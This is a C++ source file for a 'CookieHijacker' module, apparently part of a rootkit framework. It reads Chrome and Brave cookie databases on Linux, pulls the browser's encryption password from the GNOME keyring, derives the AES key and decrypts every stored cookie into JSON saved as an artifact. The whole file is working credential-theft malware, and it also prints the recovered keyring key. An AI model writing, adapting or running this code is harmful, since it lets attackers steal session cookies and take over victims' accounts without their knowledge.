#include <boost/filesystem.hpp>
#include <boost/system/system_error.hpp>
#include "../include/json.hpp"
#include <iostream>
#include <regex>
#include <vector>
#include <string>
#include <fstream>
#include <random>
#include <filesystem>
#include <tuple>
#include <vector>
#include <list>
#include <string>
#include <iostream> 
#include <memory>
#include <fstream>
#include <libsecret/secret.h>

#include <sqlite3.h>
#define __STDC_WANT_LIB_EXT1__ 1 // memcpy_s
#define ITERATION     1 
#include <string.h>
#include <list>


#include <openssl/evp.h>
#include <openssl/aes.h>

#define KEY_LEN      16

#define PATH_COOKIES_ON_PROFILE "Cookies"
#define CHROME_COOKIES_PATH "%s/.config/google-chrome/Default/Cookies"

namespace fs = boost::filesystem;

#include "CookieHijacker.h"
#include "../Utils/CryptoUtils.h"
#include "../Utils/MachineUtils.h"
#include "../amazing_rootkit/api/api.h"

void CookieHijacker::module_impl()
{
    run_ = false;

    std::cout << "Running" << module_type << " with args: " << args.dump() << std::endl;
    nlohmann::json ret_json;
    int fd = -1;

    // Iterate through the JSON object
    for (auto& [task_id, value] : args.items()) {
        // Open Chrome/Brave DB
        auto cookies_vector = get_encrypted_cookies_vector(value["cookies_path"]);

        if (cookies_vector.empty()) {
            std::cerr << "[!] Couldn't get cookies values" << std::endl;
            return;
        }

        ret_json[module_type] = decrypt_cookies(&cookies_vector);
        save_artifact(ret_json);
    }

    return;
}

cookie_vector_t CookieHijacker::get_encrypted_cookies_vector(std::string db_path) {
    
    sqlite3* DB;
    auto sol_vector = cookie_vector_t();

    if (sqlite3_open_v2(db_path.data(), &DB, SQLITE_OPEN_READONLY, NULL)) {
        std::cerr << "Error open DB " << sqlite3_errmsg(DB) << std::endl;
        exit(-1);
    }
    else
        std::cout << "Opened Database Successfully!" << std::endl;
    
    sqlite3_stmt* statement;

    const char* sql = "SELECT host_key, name, encrypted_value from cookies;";
    auto a = sqlite3_prepare_v2(DB, sql, strlen(sql), &statement, 0);
    if (sqlite3_prepare_v2(DB, sql, strlen(sql), &statement, 0) != SQLITE_OK)
    {
        std::cerr << "Open database failed\n" << std::endl;
        exit(-1);
    }

    int result = 0;
    while (true)
    {
        result = sqlite3_step(statement);

        if (result == SQLITE_ROW)
        {
            const char* host_key = (const char*)sqlite3_column_text(statement, 0);
            const char* cookie_name = (const char*)sqlite3_column_text(statement, 1);

            // Get the size of the vector
            int size = sqlite3_column_bytes(statement, 2);
            if (size == 0)
                continue;

            // Get the pointer to data
            unsigned char* p = (unsigned char*)sqlite3_column_blob(statement, 2);

            // Initialize the vector with the data
            std::vector<unsigned char> encrypted_value(p, p + size);

            std::string signature(encrypted_value.begin(), encrypted_value.begin() + 3);
            if (signature == "v10" || signature == "v11") {
                encrypted_value.erase(encrypted_value.begin(), encrypted_value.begin() + 3);
                sol_vector.push_back(make_tuple(host_key, cookie_name, encrypted_value, ""));
            }
            else {
                sol_vector.push_back(make_tuple(host_key, cookie_name, encrypted_value, ""));
            }

        }
        else
        {
            break;
        }
    }

    sqlite3_finalize(statement);
    sqlite3_close(DB);
    return sol_vector;
}

std::string CookieHijacker::derive_key(std::string pwd)
{
    size_t i;
    std::string ret = "";
    unsigned char* out;
    unsigned char salt_value[] = { 's', 'a', 'l', 't', 'y', 's' , 'a', 'l', 't' };

    out = (unsigned char*)malloc(sizeof(unsigned char) * KEY_LEN);

    printf("pass: %s\n", pwd.c_str());
    printf("ITERATION: %u\n", ITERATION);
    printf("salt: "); for (i = 0; i < sizeof(salt_value); i++) { printf("%02x", salt_value[i]); } printf("\n");

    if (PKCS5_PBKDF2_HMAC_SHA1(pwd.c_str(), pwd.size(), salt_value, sizeof(salt_value), ITERATION, KEY_LEN, out) != 0)
    {
        printf("out: "); for (i = 0; i < KEY_LEN; i++) { printf("%02x", out[i]); } printf("\n");
        ret = std::string((char*)out, KEY_LEN);
    }
    else
    {
        fprintf(stderr, "PKCS5_PBKDF2_HMAC_SHA1 failed\n");
    }

    free(out);

    return ret;
}

std::string CookieHijacker::decryptCookie(std::vector<unsigned char> ciphertext, std::string encryptionKey) {
    return AES_Decrypt_String(std::string(ciphertext.begin(), ciphertext.end()), encryptionKey, std::vector<unsigned char>(AES_BLOCK_SIZE, 0x20));
}

nlohmann::json CookieHijacker::decrypt_cookies(cookie_vector_t* cookie_vector)
{
    nlohmann::json allCookies = nlohmann::json::array();

    // Get key. This is OS dependent
    auto encryptionKey = get_key();
    for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : *cookie_vector) {
        decrypted_value = decryptCookie(encrypted_value, encryptionKey);
        
        nlohmann::json cookieJSON;
        cookieJSON["domain"] = host_key;
        cookieJSON["name"] = cookie_name;
        cookieJSON["value"] = decrypted_value;
        allCookies.push_back(std::move(cookieJSON));
    }

    return allCookies;
}

std::string CookieHijacker::get_key() {
    const SecretSchema kKeystoreSchemaV2 = {
        "chrome_libsecret_os_crypt_password_v2",
        SECRET_SCHEMA_DONT_MATCH_NAME,
        {
            {"application", SECRET_SCHEMA_ATTRIBUTE_STRING},
            {nullptr, SECRET_SCHEMA_ATTRIBUTE_STRING},
        }
    };

    GHashTable* attrs;
    attrs = g_hash_table_new_full(g_str_hash, g_str_equal,
        nullptr,   // no deleter for keys
        nullptr);  // no deleter for values
    Append(attrs, "application", "chrome");

    GError* error_ = nullptr;

    GList* results_ = nullptr;
    results_ = secret_service_search_sync(nullptr,  // default secret service
        &kKeystoreSchemaV2, attrs, static_cast<SecretSearchFlags>(SECRET_SEARCH_UNLOCK | SECRET_SEARCH_LOAD_SECRETS),
        nullptr,  // no cancellable object
        &error_);

    SecretValue * password_libsecret = ToSingleSecret(results_);
    if (password_libsecret == nullptr) {
        std::cerr << "[!] Error accessing gnome keyring. Is the user logged in (check who)?\n" << std::endl;
        exit(-1);
    }


    std::string key(secret_value_get_text(password_libsecret));

    printf("The Key is %s\n", key.c_str());

    // Derive key to get encryption key
    auto derived_key = derive_key(key);

    if (derived_key.empty()) {
        std::cerr << "[!] Error deriving key" << std::endl;
        exit(-1);
    }
    return derived_key;
}

std::string CookieHijacker::AES_Decrypt_String(std::string const& data, std::string const& key, std::vector<unsigned char> const& iVec)
{
    if (data.empty() || key.empty())
        return data;

    unsigned char decryptionIvec[AES_BLOCK_SIZE];
    memcpy(decryptionIvec, &iVec[0], AES_BLOCK_SIZE);

    AES_KEY AESkey;
    AES_set_decrypt_key((unsigned const char*)key.c_str(), key.size() * 8, &AESkey);
    unsigned char buffer[AES_BLOCK_SIZE];
    std::string value;

    for (unsigned int i = 0; i < data.size(); i += AES_BLOCK_SIZE)
    {
        AES_cbc_encrypt((unsigned const char*)data.c_str() + i, buffer, AES_BLOCK_SIZE, &AESkey, decryptionIvec, AES_DECRYPT);
        value.resize(value.size() + AES_BLOCK_SIZE);
        memcpy(&value[i], buffer, AES_BLOCK_SIZE);
    }

    /* Clean Strip padding from decrypted value.
     Remove number indicated by padding
         e.g. if last is '\x0e' then ord('\x0e') == 14, so take off 14. */

    return value.erase(value.size() - (int)value.back());
}

void CookieHijacker::Append(GHashTable* attrs_, const std::string& name, const std::string& value) {
    name_values_.push_back(name);
    gpointer name_str = static_cast<gpointer>(const_cast<char*>(name_values_.back().c_str()));
    name_values_.push_back(value);
    gpointer value_str = static_cast<gpointer>(const_cast<char*>(name_values_.back().c_str()));
    g_hash_table_insert(attrs_, name_str, value_str);
}


SecretValue* CookieHijacker::ToSingleSecret(GList* secret_items) {
    GList* first = g_list_first(secret_items);
    if (first == nullptr)
        return nullptr;
    if (g_list_next(first) != nullptr) {
        //std::cout << "OSCrypt found more than one encryption keys.";
    }
    SecretItem* secret_item = static_cast<SecretItem*>(first->data);
    SecretValue* secret_value = secret_item_get_secret(secret_item);
    return secret_value;
}
